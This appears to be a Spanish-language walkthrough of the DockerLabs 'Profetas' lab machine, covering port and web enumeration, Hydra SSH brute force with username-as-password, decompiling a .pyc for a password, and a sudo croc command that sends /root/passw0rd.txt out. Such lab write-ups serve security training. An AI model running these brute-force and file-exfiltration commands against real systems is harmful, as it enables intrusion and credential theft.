@@ -1,0 +1,228 @@
+---
+title: Profetas
+description: Resolución completa de la máquina virtual *Profetas* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Profetas**, desarrollada por *mikisbd* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone un servidor web con un panel de login sin validación real que revela una lista de nombres de usuario. Una pista en el código fuente indica que la contraseña de cada usuario es igual a su nombre, permitiendo un ataque de fuerza bruta con Hydra y obteniendo acceso SSH como `jeremias`.
+Una vez dentro, se encuentra un archivo `.pyc` que, al ser decompilado, revela constantes numéricas que forman la contraseña del usuario `ezequiel`. Finalmente, se abusa del binario `croc` con permisos sudo para leer un archivo en `/root` con la contraseña de `root`, completando la escalada de privilegios.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Profetas',
+    Autor: 'mikisbd',
+    Dificultad: 'Media',
+    Fecha: '12/07/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Profetas.zip
+sudo bash auto_deploy.sh Profetas.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Profetas/{content,exploits,nmap,scripts}
+cd Profetas
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1773118259/Ports_rrozqn.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80 172.17.0.2
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios:
+
+```bash
+feroxbuster -u http://172.17.0.2 \
+  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
+  -x php,html,txt,js -t 100 -C 404
+```
+
+![Feroxbuster](https://res.cloudinary.com/dewqswzke/image/upload/v1773118257/Feroxbuster_pg3qon.png)
+
+**Rutas encontradas:** `uploads`, `admin.php`, `dashboard.php`.
+
+En el código fuente de `index.php` se encuentra una pista codificada en Base64:
+
+![Hint](https://res.cloudinary.com/dewqswzke/image/upload/v1773118257/Hint_ovaa3y.png)
+
+Decodificada: `recuerda... tu contraseña es tu usuario`.
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Login sin validación
+
+El login no requiere validación real. Al ingresar cualquier usuario, se redirige a una lista de profetas:
+
+![Profetas](https://res.cloudinary.com/dewqswzke/image/upload/v1773118259/IndexPhp_tpfdqb.png)
+
+Se guardan todos los nombres en un archivo `profetas`.
+
+### 2.2 Fuerza bruta SSH
+
+```bash
+hydra -L profetas -P profetas ssh://172.17.0.2 -t 64 -I
+```
+
+![Hydra](https://res.cloudinary.com/dewqswzke/image/upload/v1773118257/Hydra_l48zvt.png)
+
+```bash
+ssh jeremias@172.17.0.2
+```
+
+![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1773118261/SSH_wfxf5g.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De jeremias → ezequiel
+
+Se encuentra el archivo `ezequiel.pyc`. Se transfiere a la máquina atacante y se decompila con `pycdc`:
+
+```bash
+pycdc ezequiel.pyc > ezequiel_asm
+```
+
+Se revisan las constantes:
+
+![Constantes](https://res.cloudinary.com/dewqswzke/image/upload/v1773118256/Consts_a51d4y.png)
+
+Se prueba la secuencia como contraseña de `ezequiel`:
+
+```bash
+su ezequiel
+```
+
+![Ezequiel](https://res.cloudinary.com/dewqswzke/image/upload/v1773118257/Ezequiel_xeei0r.png)
+
+### 3.2 De ezequiel → root
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1773118262/Sudo_-l_tu4yqr.png)
+
+Se puede ejecutar `croc` como root. Se encuentra un archivo con la ubicación de `/root/passw0rd.txt`.
+
+Se envía el archivo con `croc`:
+
+```bash
+sudo /usr/local/bin/croc --relay "172.17.0.2:9009" --pass "123" send /root/passw0rd.txt
+```
+
+En la máquina atacante:
+
+```bash
+croc --relay "172.17.0.2:9009" --pass "123"
+```
+
+![Password Root](https://res.cloudinary.com/dewqswzke/image/upload/v1773118259/PasswordRoot_iez0c7.png)
+
+```bash
+su root
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1773118260/Root_q8fagd.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Exposición de pista en código fuente (Base64)",
+      severity: "Media",
+      impact: "Revelación de política de contraseñas"
+    },
+    {
+      vulnerability: "Login sin validación real",
+      severity: "Media",
+      impact: "Acceso no autorizado a panel interno"
+    },
+    {
+      vulnerability: "Contraseña = nombre de usuario",
+      severity: "Alta",
+      impact: "Ataque de fuerza bruta exitoso contra SSH"
+    },
+    {
+      vulnerability: "Almacenamiento de bytecode Python con constantes sensibles",
+      severity: "Media",
+      impact: "Revelación de contraseñas"
+    },
+    {
+      vulnerability: "Permiso sudo para croc sin restricciones",
+      severity: "Crítica",
+      impact: "Lectura de archivos arbitrarios del sistema"
+    },
+    {
+      vulnerability: "Contraseña de root en texto plano",
+      severity: "Crítica",
+      impact: "Compromiso total del sistema"
+    }
+  ]}
+/>
